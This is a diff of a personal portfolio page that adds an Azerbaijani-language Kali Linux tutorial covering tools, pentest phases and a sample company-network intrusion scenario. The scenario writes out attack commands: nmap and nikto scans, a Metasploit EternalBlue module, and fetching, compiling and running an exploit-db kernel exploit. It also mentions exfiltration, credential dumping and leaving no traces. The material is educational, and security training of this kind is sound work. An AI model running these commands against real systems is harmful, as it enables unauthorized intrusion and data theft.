@@ -4,7 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Kali Linux - Zaur's Portfolio</title>
-    <link rel="stylesheet" href="../../style.css">
+    <link rel="stylesheet" href="style.css">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
 </head>
 <body>
@@ -12,43 +12,435 @@
     <div class="content">
         <header>
             <h1>Kali Linux</h1>
-            <p class="subtitle">Penetration Testing Platform</p>
+            <p class="subtitle">Etik Hakerlik və Kiber Təhlükəsizlik üçün Qüdrətli Platforma</p>
         </header>
         
         <nav>
             <ul>
-                <li><a href="../../index.html">Ana Səhifə</a></li>
+                <li><a href="index.html">Ana Səhifə</a></li>
                 <li><a href="#about">Haqqımda</a></li>
-                <li><a href="#projects">Proyektlər</a></li>
                 <li><a href="#contact">Əlaqə</a></li>
             </ul>
         </nav>
 
-        <section id="about">
-            <h2>Kali Linux Haqqında</h2>
-            <div class="about-content">
-                <p>Kali Linux, təhlükəsizlik testləri və penetrasiya testləri üçün xüsusi olaraq hazırlanmış bir Linux distributividir.</p>
+        <section id="content">
+            <h2>1. Giriş: Kali Linux nədir?</h2>
+            <div class="article-content">
+                <p>Kali Linux — Offensive Security tərəfindən yaradılmış və inkişaf etdirilən, Debian əsaslı bir Linux paylanmasıdır. Əsas məqsədi: etik hakerlik, penetrasiya testləri, OSINT, forensika və təhlükəsizlik araşdırmaları üçün vahid mühit yaratmaqdır.</p>
+                <p>İlk versiyası 2013-cü ildə çıxan Kali, BackTrack Linux-un davamçısı sayılır.</p>
 
-                <p>Kali Linux sahəsində əsas fokus nöqtələri:</p>
+                <h2>2. Kali Linux-un Əsas Xüsusiyyətləri</h2>
+                <table>
+                    <tr>
+                        <th>Xüsusiyyət</th>
+                        <th>İzah</th>
+                    </tr>
+                    <tr>
+                        <td>>600 hazır alət</td>
+                        <td>Nmap, Burp Suite, Metasploit, Wireshark və s.</td>
+                    </tr>
+                    <tr>
+                        <td>Debian əsaslı</td>
+                        <td>Dpkg və APT paket meneceri</td>
+                    </tr>
+                    <tr>
+                        <td>Canlı boot</td>
+                        <td>USB ilə işə düşür, sistemə yazılmadan işləyə bilir</td>
+                    </tr>
+                    <tr>
+                        <td>ARM cihaz dəstəyi</td>
+                        <td>Raspberry Pi, Pine64 və s.</td>
+                    </tr>
+                    <tr>
+                        <td>Custom ISO yaratma imkanı</td>
+                        <td>Kali ISO Builder vasitəsilə</td>
+                    </tr>
+                    <tr>
+                        <td>Virtual mühit dəstəyi</td>
+                        <td>VMWare, VirtualBox, Hyper-V və s.</td>
+                    </tr>
+                    <tr>
+                        <td>NetHunter</td>
+                        <td>Android cihazlar üçün mobil hacking sistemi</td>
+                    </tr>
+                    <tr>
+                        <td>Forensika və OSINT alətləri</td>
+                        <td>Autopsy, Maltego, Recon-ng, Volatility və s.</td>
+                    </tr>
+                </table>
+
+                <h2>3. İstifadə Sahələri</h2>
                 <ul>
-                    <li>Penetrasiya testləri alətləri</li>
-                    <li>Network security testing</li>
-                    <li>Web application security</li>
-                    <li>Wireless security testing</li>
-                    <li>Forensic analizi</li>
-                    <li>Reverse engineering</li>
+                    <li>🔍 Penetration Testing</li>
+                    <li>🔒 Red Team Operations</li>
+                    <li>🧠 Təhlükəsizlik təlimləri və lab mühitləri</li>
+                    <li>🧩 Malware Analysis və Reverse Engineering</li>
+                    <li>🧰 Digital Forensics və Incident Response</li>
+                    <li>🌐 Network və Web App təhlükəsizlik analizi</li>
+                    <li>🛰️ Wireless təhlükəsizlik və sniffing</li>
+                    <li>👤 Social Engineering və OSINT</li>
                 </ul>
-            </div>
-        </section>
 
-        <section id="projects">
-            <h2>Kali Linux Proyektləri</h2>
-            <div class="projects-grid">
-                <div class="project-card">
-                    <h3>Proyekt 1</h3>
-                    <p>Proyekt açıqlaması burada yer alacaq.</p>
-                    <a href="#" class="project-link">Detallar</a>
-                </div>
+                <h2>4. Kali Linux Quraşdırma Tipləri</h2>
+                <table>
+                    <tr>
+                        <th>Tip</th>
+                        <th>Təyinat</th>
+                    </tr>
+                    <tr>
+                        <td>Live Boot (USB/CD)</td>
+                        <td>Sürətli test üçün</td>
+                    </tr>
+                    <tr>
+                        <td>Hard Disk Quraşdırması</td>
+                        <td>Davamlı istifadə üçün</td>
+                    </tr>
+                    <tr>
+                        <td>Virtual Maşın (VMWare/VirtualBox)</td>
+                        <td>Təcrübə və təlimlər üçün</td>
+                    </tr>
+                    <tr>
+                        <td>Kali NetHunter</td>
+                        <td>Mobil təhlükəsizlik testləri üçün</td>
+                    </tr>
+                    <tr>
+                        <td>Kali Docker Images</td>
+                        <td>Lightweight container mühiti üçün</td>
+                    </tr>
+                </table>
+
+                <h2>5. Ən Populyar Alətlər (Kategoriyalar üzrə)</h2>
+                <h3>5.1. Network Scanning və Enumeration</h3>
+                <ul>
+                    <li>Nmap</li>
+                    <li>Netdiscover</li>
+                    <li>Masscan</li>
+                    <li>Fping</li>
+                </ul>
+
+                <h3>5.2. Exploitation Frameworks</h3>
+                <ul>
+                    <li>Metasploit Framework</li>
+                    <li>Armitage</li>
+                    <li>BeEF (Browser Exploitation Framework)</li>
+                </ul>
+
+                <h3>5.3. Web App Security</h3>
+                <ul>
+                    <li>Burp Suite Community</li>
+                    <li>OWASP ZAP</li>
+                    <li>Nikto</li>
+                    <li>Wfuzz</li>
+                    <li>Dirb / Gobuster</li>
+                </ul>
+
+                <h3>5.4. Password Cracking</h3>
+                <ul>
+                    <li>John the Ripper</li>
+                    <li>Hashcat</li>
+                    <li>Hydra</li>
+                    <li>CeWL</li>
+                </ul>
+
+                <h3>5.5. Wireless Attacks</h3>
+                <ul>
+                    <li>Aircrack-ng</li>
+                    <li>Reaver</li>
+                    <li>Wifite</li>
+                    <li>Kismet</li>
+                </ul>
+
+                <h3>5.6. Reverse Engineering</h3>
+                <ul>
+                    <li>Ghidra</li>
+                    <li>Radare2</li>
+                    <li>OllyDbg (via Wine)</li>
+                </ul>
+
+                <h3>5.7. OSINT</h3>
+                <ul>
+                    <li>theHarvester</li>
+                    <li>Maltego</li>
+                    <li>Recon-ng</li>
+                    <li>SpiderFoot</li>
+                </ul>
+
+                <h3>5.8. Forensika</h3>
+                <ul>
+                    <li>Autopsy</li>
+                    <li>Volatility</li>
+                    <li>Binwalk</li>
+                    <li>Foremost</li>
+                </ul>
+
+                <h2>6. Kali Linux ilə Real Dünyada Pentest Mərhələləri</h2>
+                <table>
+                    <tr>
+                        <th>Mərhələ</th>
+                        <th>Alətlər</th>
+                    </tr>
+                    <tr>
+                        <td>1. Recon & Info Gathering</td>
+                        <td>Nmap, WhatWeb, DNSenum, Maltego</td>
+                    </tr>
+                    <tr>
+                        <td>2. Scanning & Enumeration</td>
+                        <td>Nikto, Dirbuster, Gobuster, Enum4linux</td>
+                    </tr>
+                    <tr>
+                        <td>3. Exploitation</td>
+                        <td>Metasploit, SQLmap, Exploit-DB</td>
+                    </tr>
+                    <tr>
+                        <td>4. Post-Exploitation</td>
+                        <td>Mimikatz (Wine ilə), Empire, Powershell skriptləri</td>
+                    </tr>
+                    <tr>
+                        <td>5. Privilege Escalation</td>
+                        <td>LinPEAS, Linux Exploit Suggester</td>
+                    </tr>
+                    <tr>
+                        <td>6. Reporting</td>
+                        <td>Faraday, MagicTree, Dradis</td>
+                    </tr>
+                </table>
+
+                <h2>7. Kali ilə Wireless Hacking (WiFi Təhlükəsizliyi)</h2>
+                <ul>
+                    <li>Monitor mode – airmon-ng</li>
+                    <li>Sniffing – airodump-ng</li>
+                    <li>Handshake capture – aireplay-ng</li>
+                    <li>Password cracking – aircrack-ng, hashcat</li>
+                    <li>WPS brute-force – Reaver</li>
+                </ul>
+                <p><em>💡 Təkcə WiFi deyil, Bluetooth, ZigBee, RFID kimi protokollar üçün də alətlər var.</em></p>
+
+                <h2>8. Kali NetHunter</h2>
+                <p>Kali NetHunter – Android əsaslı cihazlar üçün hazırlanmış mobil pentest platformasıdır.</p>
+                <table>
+                    <tr>
+                        <th>Xüsusiyyət</th>
+                        <th>Təyinat</th>
+                    </tr>
+                    <tr>
+                        <td>HID attacks</td>
+                        <td>Keyboard Injection (Rubber Ducky stilində)</td>
+                    </tr>
+                    <tr>
+                        <td>BadUSB</td>
+                        <td>Fake Ethernet over USB</td>
+                    </tr>
+                    <tr>
+                        <td>WiFi attacks</td>
+                        <td>Monitor Mode dəstəyi ilə</td>
+                    </tr>
+                    <tr>
+                        <td>USB OTG dəstəyi</td>
+                        <td>USB adaptorlara dəstək</td>
+                    </tr>
+                </table>
+
+                <h2>9. Kali Tools Interface</h2>
+                <pre><code>kali-linux-top10
+kali-linux-web
+kali-linux-wireless
+kali-linux-forensics</code></pre>
+                <p>Həmçinin kali-tweaks vasitəsilə:</p>
+                <ul>
+                    <li>Kernel seçimi</li>
+                    <li>Virtual environment optimizasiya</li>
+                    <li>Bleeding-edge repo aktivləşdirmə</li>
+                </ul>
+
+                <h2>10. Kali Linux Təhlükəsizlik</h2>
+                <ul>
+                    <li>Root istifadəçisi ilə gəlməməsi (2020 sonrası dəyişiklik)</li>
+                    <li>Non-persistent Live Boot zamanı əmrlərin yadda qalmaması</li>
+                    <li>firejail, AppArmor kimi sandbox metodları</li>
+                    <li>Kali-ni hədəf sistemdə istifadə etmə: iz buraxmamaq vacibdir</li>
+                </ul>
+
+                <h2>11. Kali üçün Faydalı Əlavələr</h2>
+                <table>
+                    <tr>
+                        <th>Tool</th>
+                        <th>Nə işə yarayır?</th>
+                    </tr>
+                    <tr>
+                        <td>Faraday IDE</td>
+                        <td>Pentest menecment platforması</td>
+                    </tr>
+                    <tr>
+                        <td>CrackMapExec</td>
+                        <td>AD və SMB zəiflikləri üçün</td>
+                    </tr>
+                    <tr>
+                        <td>Chisel</td>
+                        <td>TCP tunelləmə üçün</td>
+                    </tr>
+                    <tr>
+                        <td>Evil-WinRM</td>
+                        <td>Windows sistemlərə exploit sonrası giriş</td>
+                    </tr>
+                    <tr>
+                        <td>LinEnum / LinPEAS</td>
+                        <td>Linux privilege escalation üçün</td>
+                    </tr>
+                </table>
+
+                <h2>12. Kali-də Tədris Resursları</h2>
+                <ul>
+                    <li>TryHackMe: Kali ilə lab mühitlər</li>
+                    <li>HackTheBox: Real dünya zəiflikləri</li>
+                    <li>Offensive Security Labs: Pro kurslar</li>
+                    <li>YouTube: NetworkChuck, The Cyber Mentor, John Hammond</li>
+                </ul>
+                <p>Kitablar:</p>
+                <ul>
+                    <li>"Kali Linux Revealed"</li>
+                    <li>"Penetration Testing with Kali Linux (PWK)"</li>
+                </ul>
+
+                <h2>13. Kali-nin Ən Yaxşı Tətbiqi üçün Tövsiyələr</h2>
+                <ul>
+                    <li>✅ Əsas top10 alətləri mükəmməl mənimsə</li>
+                    <li>✅ Öz custom ISO faylını yarat (minimal versiyalarla)</li>
+                    <li>✅ VirtualBox və VMWare versiyasında snapshot yarat</li>
+                    <li>✅ alias və bashrc faylında öz skriptlərini tanıt</li>
+                    <li>✅ Daima Kali Tools Update et:</li>
+                </ul>
+                <pre><code>sudo apt update && sudo apt full-upgrade -y</code></pre>
+
+                <h2>15. Kali Linux ilə Real Pentest Ssenarisi: "Şirkət Şəbəkəsinə Sızma"</h2>
+                <h3>🎯 Hədəf:</h3>
+                <p>Orta ölçülü bir şirkətin daxili şəbəkəsinə sızmaq və məlumatların təhlükəsizliyini qiymətləndirmək.</p>
+
+                <h3>📌 Mərhələ 1: İnformasiya Toplama (Reconnaissance)</h3>
+                <p>Passiv Recon:</p>
+                <ul>
+                    <li>whois, theHarvester, recon-ng, nslookup, Maltego</li>
+                    <li>Məqsəd: domenlər, e-mail adresləri, IP blokları</li>
+                </ul>
+
+                <p>Aktiv Recon:</p>
+                <ul>
+                    <li>Nmap, Netdiscover, Shodan (əgər internetdənsə)</li>
+                </ul>
+
+                <p>OS, port, versiya identifikasiyası:</p>
+                <pre><code>nmap -sS -sV -O -T4 10.0.0.5</code></pre>
+
+                <h3>📌 Mərhələ 2: Vulnerability Scanning</h3>
+                <p>Nikto, Nessus (əgər licensiya varsa), OpenVAS</p>
+                <p>Web App üçün:</p>
+                <pre><code>nikto -h http://target.local</code></pre>
+
+                <h3>📌 Mərhələ 3: Exploitation</h3>
+                <p>Metasploit, searchsploit, sqlmap</p>
+                <p>Tapılan zəiflik istifadə edilir:</p>
+                <pre><code>msfconsole
+use exploit/windows/smb/ms17_010_eternalblue</code></pre>
+
+                <h3>📌 Mərhələ 4: Post-Exploitation</h3>
+                <ul>
+                    <li>Meterpreter, PowerShell Empire, Mimikatz</li>
+                    <li>Credential dumping, lateral movement</li>
+                    <li>Pivoting: SSH tunneling, proxychains, chisel</li>
+                </ul>
+
+                <h3>📌 Mərhələ 5: Privilege Escalation</h3>
+                <p>LinPEAS, Linux Exploit Suggester, GTFOBins</p>
+                <p>Kernel exploit:</p>
+                <pre><code>wget https://exploit-db.com/exploits/37292
+gcc exploit.c -o rootme
+./rootme</code></pre>
+
+                <h3>📌 Mərhələ 6: Məlumat Çıxarılması və Report</h3>
+                <ul>
+                    <li>Faylların çıxarılması: scp, exfil via DNS, HTTPS</li>
+                    <li>Hesabat hazırlamaq üçün: Dradis, MagicTree, Faraday</li>
+                </ul>
+
+                <h2>16. Kali Linux-da Scripting və Avtomatlaşdırma</h2>
+                <h3>✅ Bash Scripting (Avtomatik Recon Skripti)</h3>
+                <pre><code>#!/bin/bash
+echo "Recon başlayır..."
+nmap -sC -sV $1 -oN nmap_results.txt
+whatweb http://$1 > web_info.txt</code></pre>
+
+                <h3>✅ Python ilə API əsaslı Recon</h3>
+                <pre><code>import requests
+
+def subdomains(domain):
+    url = f"https://crt.sh/?q=%25.{domain}&output=json"
+    r = requests.get(url)
+    for entry in r.json():
+        print(entry['name_value'])
+
+subdomains("example.com")</code></pre>
+
+                <h3>✅ PowerShell (Windows sistemdə işlədilən skript)</h3>
+                <pre><code>Get-LocalUser | Where-Object {$_.Enabled -eq $true}</code></pre>
+
+                <h2>17. Təhlükəsizlik Lab-ı Qurmaq (Offline Təlim üçün)</h2>
+                <h3>Virtual Mühit Quruluşu:</h3>
+                <ul>
+                    <li>Host sistem: Windows 10 / Linux</li>
+                    <li>Hypervisor: VMWare / VirtualBox</li>
+                    <li>VM-lər: Kali Linux, Metasploitable2, Windows 10, Active Directory DC</li>
+                </ul>
+
+                <h3>Lab Senarisi:</h3>
+                <ul>
+                    <li>Hədəf: Windows Server-də çalışan AD</li>
+                    <li>Kali ilə: LDAP enumeration, Kerberoasting, LLMNR spoofing</li>
+                    <li>Tools: BloodHound, CrackMapExec, Rubeus, Responder</li>
+                </ul>
+
+                <h2>18. Offensive Security Sertifikatları ilə İnteqrasiya</h2>
+                <p>Kali Linux aşağıdakı beynəlxalq sertifikatlar üçün əsas platformadır:</p>
+                <table>
+                    <tr>
+                        <th>Sertifikat</th>
+                        <th>Kali-də istifadə sahəsi</th>
+                    </tr>
+                    <tr>
+                        <td>OSCP</td>
+                        <td>Metasploit, Bash, Manual Exploitation</td>
+                    </tr>
+                    <tr>
+                        <td>CRTO</td>
+                        <td>C2 Frameworks, PowerShell, AD labları</td>
+                    </tr>
+                    <tr>
+                        <td>CRTP/CRTE</td>
+                        <td>Active Directory post-exploitation</td>
+                    </tr>
+                    <tr>
+                        <td>eJPT/eCPTX</td>
+                        <td>Network, web və privilege escalation ssenariləri</td>
+                    </tr>
+                </table>
+
+                <h2>19. Kali Linux üçün Tövsiyə Edilən Pro Workflow</h2>
+                <ul>
+                    <li>🧱 Ətraflı recon üçün öz bash skriptini yaz.</li>
+                    <li>🔄 Kali-nin snapshot funksiyasını istənilən mərhələdən əvvəl istifadə et.</li>
+                    <li>🧠 Exploit tətbiq etmədən əvvəl zəifliyi əl ilə yoxla.</li>
+                    <li>🧬 Report mərhələsində hər mərhələ üçün sübutları (screenshot və logs) qeyd et.</li>
+                    <li>🌐 SSH tunneling, proxychains, chisel vasitəsilə tunelləmə bacarığını inkişaf etdir.</li>
+                </ul>
+
+                <h2>20. Kali Linux ilə Etik Hakerin Mədəniyyəti</h2>
+                <ul>
+                    <li>🧘 Etik dəyərlərə sadiqlik – Bilik, gücdür; məsuliyyətlə yanaş.</li>
+                    <li>📚 Davamlı təhsil – Kali mütəmadi yenilənir, sən də öyrən.</li>
+                    <li>🧪 Təcrübə əsaslı yanaşma – real lablar, CTF platformaları.</li>
+                    <li>🌍 Cəmiyyətə dəstək – GitHub, forumlar, bloglar vasitəsilə bilik paylaş.</li>
+                </ul>
+
+                <h2>✅ Nəticə: Kali – Sadəcə Bir Sistem Deyil, Bir Güc Mənbəyidir</h2>
+                <p>Kali Linux bu gün etik hakerlər, kiber mütəxəssislər, və təhlükəsizlik araşdırmaçıları üçün alternativsiz platformadır. Onun vasitəsilə istənilən səviyyədə sızma testi həyata keçirmək, yeni alətlər qurmaq və məlumat təhlükəsizliyini təmin etmək mümkündür.</p>
             </div>
         </section>
 
@@ -67,6 +459,6 @@
             </div>
         </section>
     </div>
-    <script src="../../script.js"></script>
+    <script src="script.js"></script>
 </body>
 </html> 
